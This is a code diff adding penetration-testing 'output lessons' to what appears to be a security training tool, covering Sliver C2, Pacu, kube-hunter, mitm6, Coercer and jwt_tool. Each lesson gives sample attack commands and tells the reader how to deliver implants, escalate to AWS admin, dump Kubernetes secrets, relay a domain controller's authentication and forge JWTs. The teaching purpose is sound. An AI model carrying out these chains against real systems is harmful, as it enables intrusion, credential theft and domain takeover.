@@ -63,6 +63,10 @@ _ALIASES = {
     "prowler": "scoutsuite", "scout": "scoutsuite", "cloudsploit": "scoutsuite",
     "grype": "trivy", "ligolo": "chisel", "ligolo-ng": "chisel", "sshuttle": "chisel",
     "nc": "netcat", "ncat": "netcat", "pwncat": "netcat", "smbget": "smbclient",
+    "havoc": "sliver", "cobaltstrike": "sliver", "empire": "sliver", "mythic": "sliver",
+    "peirates": "kube-hunter", "petitpotam": "coercer", "dfscoerce": "coercer",
+    "printerbug": "coercer", "coercer.py": "coercer",
+    "jwt-tool": "jwt_tool", "jwt": "jwt_tool",
 }
 
 
@@ -3116,6 +3120,304 @@ OUTPUT_LESSONS.update({
             "smbclient is interactive in ONE share (ls/get/put) — smbmap is the tool that maps permissions across shares.",
             "'recurse ON; prompt OFF; mget *' loots an entire share at once — pull it and grep offline for secrets.",
             "Writable shares let you 'put' files — drop payloads or SCF/.url files to capture hashes from browsers.",
+        ],
+    },
+})
+
+
+# ── Batch 11: advanced/specialized — C2, cloud exploitation, K8s, coercion ──
+OUTPUT_LESSONS.update({
+
+    "sliver": {
+        "tool": "Sliver (C2)",
+        "headline": "Sliver is an open-source C2. The core distinction to read is SESSION vs BEACON — sessions are real-time and louder, beacons check in periodically and survive/evade. And generate only builds the implant; a callback appears only after it runs.",
+        "sample": (
+            "sliver > generate --mtls 10.10.14.5 --os windows\n"
+            "[*] Implant saved to /root/SHARP_TORNADO.exe\n"
+            "sliver > sessions\n"
+            " ID  Name           Transport  Remote Address   Username    OS\n"
+            " 1   SHARP_TORNADO  mtls       10.0.0.5:49122   CORP\\jdoe   windows\n"
+            "sliver > use 1\n"
+            "sliver (SHARP_TORNADO) > getprivs"
+        ),
+        "reading": [
+            {"field": "generate --mtls ... → Implant saved to ...exe",
+             "means": "You BUILT an implant binary — but nothing has run yet.",
+             "do": "You still have to DELIVER and execute it on the target. A session/beacon only appears after that."},
+            {"field": "sessions vs beacons",
+             "means": "Sessions = real-time interactive control (a live connection). Beacons = periodic asynchronous check-ins.",
+             "do": "Beacons are stealthier and survive reboots/network blips (choose for OpSec); sessions are for hands-on work."},
+            {"field": "Transport: mtls (vs https / dns)",
+             "means": "The C2 channel. mtls = mutually-authenticated TLS (encrypted); dns = slow but egress-evading.",
+             "do": "Pick the channel that fits the target's egress: https blends in, dns bypasses strict filtering, mtls is solid default."},
+            {"field": "Username: CORP\\jdoe, OS: windows",
+             "means": "Who the implant is running as and where.",
+             "do": "That's your context — a user-level implant means privesc is next; note the callback source IP."},
+        ],
+        "reference": {
+            "title": "Reading a C2",
+            "rows": [
+                ("generate", "builds the implant — you still must deliver it"),
+                ("session", "real-time, interactive — louder"),
+                ("beacon", "periodic check-in — stealthier, survives"),
+                ("transport (mtls/https/dns)", "the C2 channel — pick for egress"),
+                ("use <id>", "interact with a specific implant"),
+            ],
+        },
+        "work_with_it": (
+            "Match the implant to the job: a beacon over https/dns for a long-haul, low-profile foothold; a session "
+            "for active hands-on exploitation. Remember generate is only step one — you deliver the implant via your "
+            "initial access (phish, exploit, drop), and only then does it appear in sessions/beacons. From there, "
+            "read the Username/OS for your context and escalate."
+        ),
+        "misreads": [
+            "Sessions are real-time/interactive (louder); beacons check in periodically (stealthier, survive) — pick per OpSec.",
+            "The transport (mtls/https/dns) is your C2 channel — dns evades strict egress; https blends with normal traffic.",
+            "generate only BUILDS the implant — you must still deliver+run it; a callback appears only after execution.",
+        ],
+    },
+
+    "pacu": {
+        "tool": "Pacu (AWS exploitation)",
+        "headline": "Pacu is post-access AWS exploitation — it needs credentials first. Its modules (service__action) enumerate and escalate INSIDE an account; the privesc scan is BloodHound for AWS IAM.",
+        "sample": (
+            "Pacu (corp) > run iam__enum_permissions\n"
+            "[+] Enumerated permissions for 3 users, 2 roles\n"
+            "Pacu (corp) > run iam__privesc_scan\n"
+            "[+] Escalation method found: CreateNewPolicyVersion\n"
+            "[+] User 'deploy' can escalate to admin via iam:CreatePolicyVersion\n"
+            "Pacu (corp) > run s3__download_bucket"
+        ),
+        "reading": [
+            {"field": "the fact it's running with a session/creds",
+             "means": "Pacu operates AFTER you have AWS keys (from a leaked key, SSRF to metadata, phished creds).",
+             "do": "It's not initial access — it's what you do once inside an AWS account. Import keys first (set_keys)."},
+            {"field": "iam__enum_permissions",
+             "means": "Mapped what your compromised identity (and others) is allowed to do.",
+             "do": "Know your permissions before acting — they define your entire blast radius in the account."},
+            {"field": "iam__privesc_scan → CreateNewPolicyVersion",
+             "means": "Found a concrete IAM privilege-escalation path (one of 20+ known AWS methods).",
+             "do": "'deploy' can rewrite a policy to grant itself admin — execute it and you own the account. This is the win."},
+            {"field": "module names: service__action",
+             "means": "Pacu's convention: iam__, s3__, ec2__, etc. — categorized by AWS service and action.",
+             "do": "Chain them: enum → privesc → persistence (backdoor a role) → exfil (download buckets)."},
+        ],
+        "reference": {
+            "title": "Pacu is AWS post-exploitation",
+            "rows": [
+                ("needs AWS keys first", "post-access, not initial access"),
+                ("iam__enum_permissions", "your blast radius in the account"),
+                ("iam__privesc_scan", "IAM escalation paths (BloodHound for AWS)"),
+                ("s3__/ec2__ modules", "loot buckets, snapshots, secrets"),
+                ("persistence modules", "backdoor roles/users to stay"),
+            ],
+        },
+        "work_with_it": (
+            "Once you have any AWS credential, import it and run iam__enum_permissions to learn your reach, then "
+            "iam__privesc_scan to find the path to admin — AWS has 20+ IAM escalation techniques, and one loose "
+            "permission (CreatePolicyVersion, PassRole, AttachUserPolicy) is game over. Then persist and exfil. "
+            "It's the cloud equivalent of the enum→privesc→loot chain you run on a host."
+        ),
+        "misreads": [
+            "Pacu is post-access AWS exploitation — it needs credentials first (leaked key/SSRF), not initial access.",
+            "iam__privesc_scan finds IAM escalation paths — one misconfigured permission escalates to full admin.",
+            "It's the AWS equivalent of host post-exploitation: enumerate → escalate → persist → exfil within the account.",
+        ],
+    },
+
+    "kube-hunter": {
+        "tool": "kube-hunter",
+        "headline": "kube-hunter maps a Kubernetes cluster's attack surface — and the big three findings are cluster-takeover: an unauthenticated Kubelet or API server is RCE, and exposed etcd is every secret in the cluster.",
+        "sample": (
+            "$ kube-hunter --remote 10.0.0.30\n"
+            "| VULNERABILITIES\n"
+            "| LOCATION         CATEGORY          VULNERABILITY\n"
+            "| 10.0.0.30:10250  Remote Code Exec  Anonymous Kubelet access\n"
+            "| 10.0.0.30:8080   Info Disclosure   Insecure (non-TLS) API server\n"
+            "| 10.0.0.30:2379   Access Risk       Etcd accessible without auth"
+        ),
+        "reading": [
+            {"field": "10250  Anonymous Kubelet access — Remote Code Exec",
+             "means": "The kubelet (node agent) accepts unauthenticated requests — you can run commands IN pods.",
+             "do": "That's RCE on the cluster's workloads. Use it to exec into containers and pivot toward secrets/tokens."},
+            {"field": "8080  Insecure API server",
+             "means": "The Kubernetes API is exposed with no auth/TLS — full cluster control.",
+             "do": "Point kubectl at it: you can create pods (mount the host, escape), read all secrets — total cluster takeover."},
+            {"field": "2379  Etcd accessible without auth",
+             "means": "etcd is the cluster's database — it holds EVERY secret, token, and config, unencrypted at rest by default.",
+             "do": "Read it directly (etcdctl) to dump all cluster secrets — service-account tokens, credentials, the lot."},
+            {"field": "CATEGORY column (RCE / Info Disc / Access)",
+             "means": "kube-hunter's severity/impact tag per finding.",
+             "do": "Prioritise Remote Code Exec, then Access Risk — those are cluster-compromise, not informational."},
+        ],
+        "reference": {
+            "title": "The cluster-takeover findings",
+            "rows": [
+                ("Kubelet 10250 (anon)", "RCE — exec into pods"),
+                ("API server 8080/6443 (no auth)", "full cluster control via kubectl"),
+                ("etcd 2379 (no auth)", "every secret in the cluster"),
+                ("exposed dashboard", "GUI cluster control"),
+                ("escalate with", "kubectl / peirates after confirming access"),
+            ],
+        },
+        "work_with_it": (
+            "Treat any unauthenticated Kubelet, API server, or etcd as cluster game-over: the API server lets you "
+            "create a privileged pod that mounts the host and escapes to the node; etcd hands you every secret; the "
+            "Kubelet gives you pod RCE. kube-hunter finds the surface — confirm access, then drive it with kubectl or "
+            "peirates to escape the container and own the cluster."
+        ),
+        "misreads": [
+            "An unauthenticated Kubelet (10250) or API server is cluster RCE — you run commands in pods / control everything.",
+            "Exposed etcd (2379) holds every secret in the cluster unencrypted — it's the crown jewels.",
+            "kube-hunter finds the surface; you still escalate (kubectl/peirates) — confirm the access is real first.",
+        ],
+    },
+})
+
+
+# ── Batch 11b: IPv6 takeover + auth coercion + JWT attacks ─────────────────
+OUTPUT_LESSONS.update({
+
+    "mitm6": {
+        "tool": "mitm6",
+        "headline": "mitm6 weaponizes the fact that IPv6 is ON by default and unconfigured — it makes YOU the network's DNS server without touching IPv4. It's the capture half of an attack; pair it with ntlmrelayx for the payoff.",
+        "sample": (
+            "$ mitm6 -d corp.local\n"
+            "Starting mitm6 (IPv6: fe80::a1b2)\n"
+            "[+] Sent spoofed DHCPv6 reply to fe80::victim (now their DNS server)\n"
+            "[+] Client fe80::victim requested WPAD via DNS\n"
+            "[+] Sent WPAD spoof — victim will proxy through us\n"
+            "[+] Captured NTLM auth for CORP\\jdoe (relay with ntlmrelayx)"
+        ),
+        "reading": [
+            {"field": "Sent spoofed DHCPv6 reply (now their DNS server)",
+             "means": "You answered the victim's IPv6 autoconfig and became their DNS server — Windows prefers IPv6 by default.",
+             "do": "You now control name resolution for that host over IPv6, invisibly to anyone watching IPv4 only."},
+            {"field": "requested WPAD via DNS → WPAD spoof",
+             "means": "The victim asked for the web-proxy config (WPAD); you answered, funneling its traffic/auth through you.",
+             "do": "WPAD poisoning captures the victim's NTLM authentication as it proxies through your rogue server."},
+            {"field": "Captured NTLM auth ... relay with ntlmrelayx",
+             "means": "mitm6 is the TRIGGER — it forces/captures auth; the value comes from relaying it.",
+             "do": "Run ntlmrelayx alongside (relay to LDAP/LDAPS for a DC takeover, or to another host). mitm6 alone just captures."},
+            {"field": "(implicit) affects the whole segment",
+             "means": "It responds to IPv6 on the local network broadly.",
+             "do": "It's noisy and can disrupt IPv6 connectivity — use it deliberately and briefly, not as a background scanner."},
+        ],
+        "reference": {
+            "title": "mitm6 + relay = classic AD takeover",
+            "rows": [
+                ("IPv6 on by default", "the misconfig it abuses — no IPv4 needed"),
+                ("DHCPv6 + DNS spoof", "you become the victim's DNS"),
+                ("WPAD poisoning", "captures NTLM auth"),
+                ("+ ntlmrelayx", "relay to LDAP(S) → DC takeover"),
+                ("noisy / disruptive", "affects the whole segment — use briefly"),
+            ],
+        },
+        "work_with_it": (
+            "mitm6 is one of the highest-impact modern AD attacks precisely because IPv6 is enabled and unmonitored on "
+            "most networks. Run it WITH ntlmrelayx (mitm6 captures over IPv6, relay forwards to LDAPS to grant yourself "
+            "domain rights or dump the domain). It's loud and disrupts IPv6, so fire it deliberately — and note the "
+            "defense (disable IPv6 or block rogue DHCPv6) when you write it up for the blue team."
+        ),
+        "misreads": [
+            "mitm6 abuses IPv6 being ON by default — it makes YOU the DNS server over IPv6 without touching IPv4.",
+            "It's the trigger/capture half — pair it with ntlmrelayx to relay the auth (mitm6 + relay = AD takeover).",
+            "It's noisy and disrupts IPv6 for the whole segment — use it deliberately and briefly, not passively.",
+        ],
+    },
+
+    "coercer": {
+        "tool": "Coercer (auth coercion)",
+        "headline": "Coercer FORCES a target — usually a Domain Controller — to authenticate to you, via RPC bugs like PetitPotam and PrinterBug. Coercing a DC gives you its machine-account auth to relay; the coercion is the trigger, the relay is the payoff.",
+        "sample": (
+            "$ coercer coerce -u jdoe -p Pass123 -d corp.local -t 10.0.0.10 -l 10.10.14.5\n"
+            "[+] Trying MS-EFSR (PetitPotam)...\n"
+            "[+] EfsRpcOpenFileRaw SUCCEED — DC01 authenticated to 10.10.14.5\n"
+            "[+] Trying MS-RPRN (PrinterBug)... already coerced\n"
+            "[+] Coercion successful via MS-EFSR"
+        ),
+        "reading": [
+            {"field": "EfsRpcOpenFileRaw SUCCEED — DC01 authenticated to you",
+             "means": "An RPC method (here PetitPotam/MS-EFSR) forced the DC to connect and authenticate to YOUR listener.",
+             "do": "You now have the DC's MACHINE-account authentication inbound — capture/relay it (you must be listening)."},
+            {"field": "Trying MS-EFSR / MS-RPRN / MS-DFSNM",
+             "means": "Coercer cycles many coercion techniques (PetitPotam, PrinterBug, DFSCoerce) to find one that's unpatched.",
+             "do": "One SUCCEED is all you need. If all fail, the DC is patched against the known coercion RPCs."},
+            {"field": "-l 10.10.14.5 (the listener)",
+             "means": "Where the coerced auth is sent — your relay/capture host.",
+             "do": "Point it at your ntlmrelayx. Coercing to yourself only matters if something's there to catch the auth."},
+            {"field": "target is a DC (10.0.0.10)",
+             "means": "Coercing a Domain Controller yields its machine account — extremely powerful.",
+             "do": "Relay the DC's auth to AD CS (ESC8) or LDAP → domain compromise. That's the whole point of coercing a DC."},
+        ],
+        "reference": {
+            "title": "Coercion methods (the trigger)",
+            "rows": [
+                ("MS-EFSR (PetitPotam)", "EFS RPC coercion"),
+                ("MS-RPRN (PrinterBug)", "print-spooler coercion"),
+                ("MS-DFSNM (DFSCoerce)", "DFS coercion"),
+                ("coerce a DC", "its machine account — relay to ADCS/LDAP"),
+                ("+ ntlmrelayx", "the payoff — domain takeover"),
+            ],
+        },
+        "work_with_it": (
+            "Coercer is the trigger in a relay chain: stand up ntlmrelayx (target AD CS web enrollment for ESC8, or "
+            "LDAPS), then coerce a DC to authenticate to it. It tries every known coercion RPC until one lands, so a "
+            "single SUCCEED against an unpatched method hands you the DC's machine account to relay into a domain "
+            "takeover. All-fail means the DC is patched — note that (and the patches) for the report."
+        ),
+        "misreads": [
+            "Coercer FORCES auth from a target (PetitPotam/PrinterBug/DFSCoerce) — it's the trigger, ntlmrelayx is the payoff.",
+            "Coercing a DC yields its MACHINE-account auth — relay it to AD CS (ESC8) or LDAP for domain takeover.",
+            "It cycles many RPC methods to find an unpatched one — a single SUCCEED is enough; all-fail means patched.",
+        ],
+    },
+
+    "jwt_tool": {
+        "tool": "jwt_tool",
+        "headline": "JWT attacks target the token's 'alg' field and its signature. The payload is base64 (readable by anyone) — the game is defeating the SIGNATURE so you can TAMPER: flip admin:false to true and re-sign.",
+        "sample": (
+            "$ jwt_tool eyJhbGciOiJIUzI1NiJ9...\n"
+            "Token header:  {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n"
+            "Token payload: {\"user\":\"jdoe\",\"admin\":false,\"exp\":...}\n"
+            "[+] Testing alg:none bypass... rejected\n"
+            "[+] Testing HS/RSA key confusion... rejected\n"
+            "[+] Cracking HMAC secret... SECRET FOUND: 'secret123'"
+        ),
+        "reading": [
+            {"field": "Token payload: {\"admin\":false} (base64, not encrypted)",
+             "means": "The JWT payload is just base64-encoded — anyone can DECODE and read it. It's not confidential.",
+             "do": "Read it for interesting claims (user, admin, role, scopes). The value is what you'll want to TAMPER."},
+            {"field": "alg:none bypass",
+             "means": "Testing whether the server accepts a token with the signature stripped (alg set to 'none').",
+             "do": "If ACCEPTED, you forge any token with no signature at all — instant auth bypass. Here it was rejected."},
+            {"field": "HS/RSA key confusion",
+             "means": "The RS256→HS256 attack — sign with the server's PUBLIC key as an HMAC secret.",
+             "do": "If the server verifies HS256 using its RSA public key, you can forge tokens with the (public) key. Rejected here."},
+            {"field": "Cracking HMAC secret → SECRET FOUND: 'secret123'",
+             "means": "The HS256 signing key was weak and got brute-forced.",
+             "do": "GAME OVER for auth — with the secret you re-sign ANY payload. Set admin:true, re-sign, become admin."},
+        ],
+        "reference": {
+            "title": "The JWT attack surface",
+            "rows": [
+                ("alg:none", "strip signature — forge freely if accepted"),
+                ("RS256→HS256 confusion", "sign with the public key as HMAC"),
+                ("weak HMAC secret", "crack it → forge any token"),
+                ("payload = base64", "readable, NOT encrypted — tamper target"),
+                ("kid injection / jku", "point verification at attacker-controlled keys"),
+            ],
+        },
+        "work_with_it": (
+            "Decode the token first (it's base64) to find the claim worth changing (admin/role/user), then attack the "
+            "signature: try alg:none, RS256→HS256 confusion, and crack the HMAC secret with a wordlist. Any success "
+            "lets you forge a tampered token — flip admin:false to true, re-sign, and replay it. Modern APIs live and "
+            "die by JWT integrity, so a weak secret or an alg-confusion bug is often full account/privilege takeover."
+        ),
+        "misreads": [
+            "JWT attacks target the 'alg' field: alg:none strips the signature, RS256→HS256 confusion abuses the public key.",
+            "A cracked/weak HMAC secret lets you FORGE any token — flip admin:false to true and re-sign.",
+            "The payload is base64, NOT encrypted — anyone can READ it; defeating the SIGNATURE is what lets you TAMPER.",
         ],
     },
 })
